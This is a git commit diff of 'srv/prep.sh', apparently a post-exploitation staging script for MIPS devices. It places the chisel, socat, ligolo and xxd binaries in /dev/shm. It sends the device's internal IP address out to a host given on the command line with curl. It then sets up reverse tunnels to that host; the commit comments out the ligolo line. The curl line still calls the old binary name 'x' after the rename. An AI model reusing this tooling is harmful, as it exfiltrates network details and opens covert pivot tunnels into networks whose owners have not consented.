2167bbb9d5d49aa8453a6c7032e8545c50a8310d
mascencerro <mascencerro@gmail.com>
2024-01-26 13:58:10 -0600

    output file names change and cleanup

--- srv/prep.sh
+++ srv/prep.sh
@@ -7,16 +7,15 @@ SOCAT_BIN=socat-mips32
 XXD_BIN=xxd-mips32
 LIGOLO_BIN=ligolo-mips32
 
-CHISEL_OUT_BIN=ch
-SOCAT_OUT_BIN=so
-XXD_OUT_BIN=x
-LIGOLO_OUT_BIN=lig
+CHISEL_OUT_BIN=chisel
+SOCAT_OUT_BIN=socat
+XXD_OUT_BIN=xxd
+LIGOLO_OUT_BIN=ligolo
 
 PREP_SCRIPT=/dev/shm/prep.sh
 
-GET_INTERNAL_IP=$(ip a s eth0 | grep -i 'global' | cut -d ' ' -f6 | ${XXD_OUT_BIN} -p)
-
 # Report back internal IP address of device in hex
+GET_INTERNAL_IP=$(ip a s eth0 | grep -i 'global' | cut -d ' ' -f6 | ${XXD_OUT_BIN} -p)
 curl -d 'ip':$(ip a s eth0 | grep -i 'global' | cut -d ' ' -f6 | x -p) -H 'Content-Type: application/json' -X POST http://${1}:${2}/${GET_INTERNAL_IP}
 
 # Prepare file destination and transfer files
@@ -42,4 +41,4 @@ sleep 5
 #${OUT_PATH}/${CHISEL_OUT_BIN} client ${1}:${2} R:socks &
 
 # Start ligolo
-${OUT_PATH}/${LIGOLO_OUT_BIN} -connect ${1}:${2} -ignore-cert 2>&1 > /dev/null
+#${OUT_PATH}/${LIGOLO_OUT_BIN} -connect ${1}:${2} -ignore-cert 2>&1 > /dev/null
